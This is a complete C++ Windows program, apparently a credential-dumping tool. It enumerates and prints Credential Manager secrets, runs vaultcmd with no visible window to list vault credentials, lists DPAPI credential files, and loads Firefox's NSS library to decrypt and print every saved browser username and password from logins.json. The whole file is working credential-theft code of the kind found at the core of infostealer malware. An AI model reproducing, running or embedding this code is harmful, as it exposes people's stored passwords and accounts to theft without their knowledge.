#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <wincred.h>
#include <shlobj.h>
#include <iostream>
#include <iomanip>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")


std::wstring GetErrorMessage(DWORD error)
{
    LPWSTR buffer = nullptr;
    DWORD size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        reinterpret_cast<LPWSTR>(&buffer), 0, nullptr);

    std::wstring message = (size && buffer) ? buffer : L"(unknown error)";
    if (buffer) LocalFree(buffer);
    return message;
}

void PrintHex(const BYTE* data, DWORD size)
{
    if (!data || size == 0) return;
    for (DWORD i = 0; i < size; ++i)
    {
        std::wcout << std::hex << std::setw(2) << std::setfill(L'0')
            << static_cast<DWORD>(data[i]) << L" ";
        if ((i + 1) % 16 == 0) std::wcout << L"\n              ";
    }
    std::wcout << std::dec << std::setfill(L' ') << L"\n";
}


const wchar_t* CredTypeToString(DWORD type)
{
    switch (type)
    {
    case CRED_TYPE_GENERIC:                 return L"Generic";
    case CRED_TYPE_DOMAIN_PASSWORD:         return L"Domain Password";
    case CRED_TYPE_DOMAIN_CERTIFICATE:      return L"Domain Certificate";
    case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return L"Domain Visible Password";
    case CRED_TYPE_GENERIC_CERTIFICATE:     return L"Generic Certificate";
    case CRED_TYPE_DOMAIN_EXTENDED:         return L"Domain Extended";
    default:                                return L"Unknown";
    }
}

const wchar_t* PersistToString(DWORD persist)
{
    switch (persist)
    {
    case CRED_PERSIST_SESSION:       return L"Session";
    case CRED_PERSIST_LOCAL_MACHINE: return L"Local Machine";
    case CRED_PERSIST_ENTERPRISE:    return L"Enterprise";
    default:                         return L"Unknown";
    }
}

void DumpCredentialManager()
{
    std::wcout << L"CREDENTIAL MANAGER\n\n";

    DWORD count = 0;
    PCREDENTIALW* credentials = nullptr;

    if (!CredEnumerateW(nullptr, 0, &count, &credentials))
    {
        DWORD err = GetLastError();
        std::wcout << L"CredEnumerateW failed: " << err
            << L" (" << GetErrorMessage(err) << L")\n\n";
        return;
    }

    std::wcout << L"Found " << count << L" credential(s)\n\n";

    for (DWORD i = 0; i < count; ++i)
    {
        PCREDENTIALW cred = credentials[i];

        std::wcout << L"--- [" << i << L"] ---\n";
        std::wcout << L"  Target Name : "
            << (cred->TargetName ? cred->TargetName : L"(null)") << L"\n";
        std::wcout << L"  User Name   : "
            << (cred->UserName ? cred->UserName : L"(null)") << L"\n";
        std::wcout << L"  Type        : " << CredTypeToString(cred->Type)
            << L" (" << cred->Type << L")\n";
        std::wcout << L"  Persist     : " << PersistToString(cred->Persist)
            << L" (" << cred->Persist << L")\n";
        std::wcout << L"  Comment     : "
            << (cred->Comment ? cred->Comment : L"(null)") << L"\n";
        std::wcout << L"  Flags       : 0x" << std::hex << cred->Flags << std::dec << L"\n";
        std::wcout << L"  Blob Size   : " << cred->CredentialBlobSize << L" bytes\n";

        if (cred->CredentialBlob && cred->CredentialBlobSize > 0)
        {
            bool printed = false;
            if ((cred->CredentialBlobSize % sizeof(wchar_t)) == 0)
            {
                std::wstring blob(
                    reinterpret_cast<const wchar_t*>(cred->CredentialBlob),
                    cred->CredentialBlobSize / sizeof(wchar_t));

                bool printable = true;
                for (wchar_t ch : blob)
                {
                    if (ch < 32 && ch != L'\t' && ch != L'\n' && ch != L'\r')
                    {
                        printable = false;
                        break;
                    }
                }

                if (printable && !blob.empty())
                {
                    std::wcout << L"  Credential  : " << blob << L"\n";
                    printed = true;
                }
            }

            if (!printed)
            {
                std::wcout << L"  Credential  : (hex dump)\n";
                std::wcout << L"              ";
                PrintHex(cred->CredentialBlob, cred->CredentialBlobSize);
            }
        }
        else
        {
            std::wcout << L"  Credential  : (empty)\n";
        }

        std::wcout << L"\n";
    }

    CredFree(credentials);
    std::wcout << L"\n";
}


static void RunVaultCmd(const std::wstring& args)
{
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        std::wcout << L"CreatePipe failed: " << GetLastError() << L"\n";
        return;
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    std::wstring cmdLine = L"vaultcmd " + args;

    if (!CreateProcessW(nullptr, const_cast<LPWSTR>(cmdLine.c_str()),
        nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi))
    {
        std::wcout << L"CreateProcess failed: " << GetLastError() << L"\n";
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    CloseHandle(hWritePipe);
    WaitForSingleObject(pi.hProcess, 10000);

    std::string output;
    char buffer[4096];
    DWORD bytesRead = 0;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        output += buffer;
    }

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (output.empty())
        std::wcout << L"(no output or empty vault)\n\n";
    else
        std::cout << output << "\n";
}

void DumpWindowsVault()
{
    std::wcout << L"WINDOWS VAULT\n\n";

    std::wcout << L"Windows Credentials\n\n";
    RunVaultCmd(L"/listcreds:\"Windows Credentials\" /all");

    std::wcout << L"Web Credentials\n\n";
    RunVaultCmd(L"/listcreds:\"Web Credentials\" /all");

    std::wcout << L"\n";
}


void DumpCredentialFiles()
{
    std::wcout << L"DPAPI CREDENTIAL FILES\n\n";

    PWSTR appDataPath = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appDataPath)))
    {
        std::wcout << L"SHGetKnownFolderPath failed\n";
        return;
    }

    std::wstring credDir = std::wstring(appDataPath) + L"\\Microsoft\\Credentials";
    CoTaskMemFree(appDataPath);

    std::wstring searchPath = credDir + L"\\*";

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        std::wcout << L"No credential files found or access denied.\n";
        std::wcout << L"  Path: " << credDir << L"\n";
        std::wcout << L"  Error: " << err << L" (" << GetErrorMessage(err) << L")\n\n";
        return;
    }

    int fileCount = 0;
    do
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        std::wcout << L"  File: " << fd.cFileName << L"\n";
        std::wcout << L"    Size : " << (static_cast<ULONGLONG>(fd.nFileSizeHigh) << 32 | fd.nFileSizeLow)
            << L" bytes\n";

        FILETIME localTime;
        SYSTEMTIME st;
        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &localTime);
        FileTimeToSystemTime(&localTime, &st);

        std::wcout << L"    Modified: "
            << st.wYear << L"-" << std::setw(2) << std::setfill(L'0') << st.wMonth << L"-"
            << std::setw(2) << st.wDay << L" "
            << std::setw(2) << st.wHour << L":"
            << std::setw(2) << st.wMinute << L":"
            << std::setw(2) << st.wSecond
            << std::dec << std::setfill(L' ') << L"\n\n";

        fileCount++;
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);

    std::wcout << L"Total: " << fileCount << L" encrypted credential file(s)\n";
    std::wcout << L"Note: These are DPAPI-encrypted. Decryption requires the user's masterkeys.\n\n";
}

struct SECItem {
    int type;
    unsigned char* data;
    unsigned int len;
};

typedef int   (*NSS_InitFunc)(const char*);
typedef int   (*NSS_ShutdownFunc)();
typedef void* (*PK11_GetInternalKeySlotFunc)();
typedef int   (*PK11_AuthenticateFunc)(void*, int, void*);
typedef int   (*PK11SDR_DecryptFunc)(SECItem*, SECItem*, void*);
typedef void  (*PK11_FreeSlotFunc)(void*);
typedef void  (*SECITEM_FreeItemFunc)(SECItem*, int);

struct NssApi {
    HMODULE hMozglue = nullptr;
    HMODULE hNss = nullptr;

    NSS_InitFunc                 NSS_Init = nullptr;
    NSS_ShutdownFunc             NSS_Shutdown = nullptr;
    PK11_GetInternalKeySlotFunc  PK11_GetInternalKeySlot = nullptr;
    PK11_AuthenticateFunc        PK11_Authenticate = nullptr;
    PK11SDR_DecryptFunc          PK11SDR_Decrypt = nullptr;
    PK11_FreeSlotFunc            PK11_FreeSlot = nullptr;
    SECITEM_FreeItemFunc         SECITEM_FreeItem = nullptr;
};

struct FirefoxLogin {
    std::string url;
    std::string user;
    std::string pass;
};

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::vector<unsigned char> Base64Decode(const std::string& encoded)
{
    std::vector<unsigned char> result;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[static_cast<unsigned char>(base64_chars[i])] = i;

    int val = 0, bits = -8;
    for (unsigned char c : encoded) {
        if (c == '=') break;
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        bits += 6;
        if (bits >= 0) {
            result.push_back(static_cast<unsigned char>((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return result;
}

std::wstring FindFirefoxInstallDir()
{
    const wchar_t* candidates[] = {
        L"C:\\Program Files\\Mozilla Firefox\\",
        L"C:\\Program Files (x86)\\Mozilla Firefox\\"
    };

    for (auto dir : candidates) {
        std::wstring dll = std::wstring(dir) + L"nss3.dll";
        if (GetFileAttributesW(dll.c_str()) != INVALID_FILE_ATTRIBUTES)
            return dir;
    }
    return L"";
}

std::wstring FindFirefoxProfileDir()
{
    PWSTR appData = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appData)))
        return L"";

    std::wstring profilesRoot = std::wstring(appData) + L"\\Mozilla\\Firefox\\Profiles";
    CoTaskMemFree(appData);

    WIN32_FIND_DATAW fd{};
    std::wstring search = profilesRoot + L"\\*";
    HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return L"";

    std::wstring found;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;

        std::wstring profile = profilesRoot + L"\\" + fd.cFileName;
        std::wstring logins = profile + L"\\logins.json";
        std::wstring key4 = profile + L"\\key4.db";

        if (GetFileAttributesW(logins.c_str()) != INVALID_FILE_ATTRIBUTES &&
            GetFileAttributesW(key4.c_str()) != INVALID_FILE_ATTRIBUTES)
        {
            found = profile;
            break;
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);

    return found;
}

bool LoadNss(NssApi& nss, const std::wstring& firefoxDir)
{
    nss.hMozglue = LoadLibraryExW(
        (firefoxDir + L"mozglue.dll").c_str(), nullptr,
        LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!nss.hMozglue) {
        std::wcerr << L"Failed to load mozglue.dll. Error: " << GetLastError() << L"\n";
        return false;
    }

    nss.hNss = LoadLibraryExW(
        (firefoxDir + L"nss3.dll").c_str(), nullptr,
        LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!nss.hNss) {
        std::wcerr << L"Failed to load nss3.dll. Error: " << GetLastError() << L"\n";
        return false;
    }

    nss.NSS_Init = (NSS_InitFunc)GetProcAddress(nss.hNss, "NSS_Init");
    nss.NSS_Shutdown = (NSS_ShutdownFunc)GetProcAddress(nss.hNss, "NSS_Shutdown");
    nss.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotFunc)GetProcAddress(nss.hNss, "PK11_GetInternalKeySlot");
    nss.PK11_Authenticate = (PK11_AuthenticateFunc)GetProcAddress(nss.hNss, "PK11_Authenticate");
    nss.PK11SDR_Decrypt = (PK11SDR_DecryptFunc)GetProcAddress(nss.hNss, "PK11SDR_Decrypt");
    nss.PK11_FreeSlot = (PK11_FreeSlotFunc)GetProcAddress(nss.hNss, "PK11_FreeSlot");
    nss.SECITEM_FreeItem = (SECITEM_FreeItemFunc)GetProcAddress(nss.hNss, "SECITEM_FreeItem");

    struct { const char* name; void* ptr; } required[] = {
        { "NSS_Init",                (void*)nss.NSS_Init                },
        { "PK11_GetInternalKeySlot", (void*)nss.PK11_GetInternalKeySlot },
        { "PK11_Authenticate",       (void*)nss.PK11_Authenticate       },
        { "PK11SDR_Decrypt",         (void*)nss.PK11SDR_Decrypt         },
        { "PK11_FreeSlot",           (void*)nss.PK11_FreeSlot           },
    };

    bool allFound = true;
    for (auto& r : required) {
        if (!r.ptr) {
            std::wcerr << L"Missing NSS symbol: " << r.name << L"\n";
            allFound = false;
        }
    }
    return allFound;
}

std::string DecryptFirefoxBlob(NssApi& nss, const std::string& b64)
{
    std::vector<unsigned char> raw = Base64Decode(b64);
    if (raw.empty()) return "";

    SECItem request = { 0, raw.data(), (unsigned int)raw.size() };
    SECItem reply = { 0, nullptr, 0 };

    int rc = nss.PK11SDR_Decrypt(&request, &reply, nullptr);

    std::string result;
    if (rc == 0) {
        result.assign(reinterpret_cast<char*>(reply.data), reply.len);
        if (nss.SECITEM_FreeItem) nss.SECITEM_FreeItem(&reply, 0);
    }
    return result;
}

static size_t FindJsonField(const std::string& json, size_t start,
    const std::string& key, std::string& out)
{
    std::string needle = "\"" + key + "\"";
    size_t p = json.find(needle, start);
    if (p == std::string::npos) return std::string::npos;

    size_t colon = json.find(':', p + needle.size());
    if (colon == std::string::npos) return std::string::npos;

    size_t q1 = json.find('"', colon + 1);
    if (q1 == std::string::npos) return std::string::npos;

    size_t q2 = q1 + 1;
    while (q2 < json.size()) {
        if (json[q2] == '\\') { q2 += 2; continue; }
        if (json[q2] == '"')  break;
        ++q2;
    }
    if (q2 >= json.size()) return std::string::npos;

    out = json.substr(q1 + 1, q2 - q1 - 1);
    return q2;
}

void DumpFirefoxPasswords()
{
    std::wcout << L"FIREFOX PASSWORDS\n\n";

    std::wstring ffDir = FindFirefoxInstallDir();
    std::wstring profile = FindFirefoxProfileDir();

    if (ffDir.empty()) {
        std::wcout << L"Firefox install directory not found. Skipping.\n\n";
        return;
    }
    if (profile.empty()) {
        std::wcout << L"Firefox profile directory not found. Skipping.\n\n";
        return;
    }

    std::wcout << L"Firefox dir : " << ffDir << L"\n";
    std::wcout << L"Profile dir : " << profile << L"\n";

    NssApi nss;
    if (!LoadNss(nss, ffDir)) {
        std::wcout << L"Failed to load NSS. Skipping Firefox.\n\n";
        return;
    }

    std::string profileA(profile.begin(), profile.end());
    if (nss.NSS_Init(profileA.c_str()) != 0) {
        std::wcout << L"NSS_Init failed.\n\n";
        return;
    }

    void* slot = nss.PK11_GetInternalKeySlot();
    if (!slot) {
        std::wcout << L"PK11_GetInternalKeySlot failed.\n\n";
        if (nss.NSS_Shutdown) nss.NSS_Shutdown();
        return;
    }

    if (nss.PK11_Authenticate(slot, 1, nullptr) != 0) {
        std::wcout << L"PK11_Authenticate failed (a Primary Password is likely set).\n\n";
        nss.PK11_FreeSlot(slot);
        if (nss.NSS_Shutdown) nss.NSS_Shutdown();
        return;
    }

    std::wstring loginsPath = profile + L"\\logins.json";
    std::ifstream f(loginsPath, std::ios::binary);
    if (!f) {
        std::wcout << L"Cannot open logins.json.\n\n";
        nss.PK11_FreeSlot(slot);
        if (nss.NSS_Shutdown) nss.NSS_Shutdown();
        return;
    }
    std::string json((std::istreambuf_iterator<char>(f)),
        std::istreambuf_iterator<char>());

    std::vector<FirefoxLogin> results;
    size_t pos = 0;
    while (true) {
        std::string hostname, userEnc, passEnc;

        size_t pHost = FindJsonField(json, pos, "hostname", hostname);
        if (pHost == std::string::npos) break;

        size_t pUser = FindJsonField(json, pHost, "encryptedUsername", userEnc);
        size_t pPass = FindJsonField(json, pHost, "encryptedPassword", passEnc);
        if (pUser == std::string::npos || pPass == std::string::npos) break;

        FirefoxLogin L;
        L.url = hostname;
        L.user = DecryptFirefoxBlob(nss, userEnc);
        L.pass = DecryptFirefoxBlob(nss, passEnc);
        results.push_back(L);

        pos = pPass;
    }

    nss.PK11_FreeSlot(slot);
    if (nss.NSS_Shutdown) nss.NSS_Shutdown();

    std::wcout << L"Found " << results.size() << L" Firefox login(s):\n\n";
    for (size_t i = 0; i < results.size(); ++i) {
        std::cout << "[" << i << "]\n";
        std::cout << "  URL  : " << results[i].url << "\n";
        std::cout << "  User : " << results[i].user << "\n";
        std::cout << "  Pass : " << results[i].pass << "\n\n";
    }

    std::wcout << L"\n";
}



int wmain()
{

    DumpCredentialManager();
    DumpWindowsVault();
    DumpCredentialFiles();
    DumpFirefoxPasswords();

    std::wcout << L"Done!\n";
    return 0;
}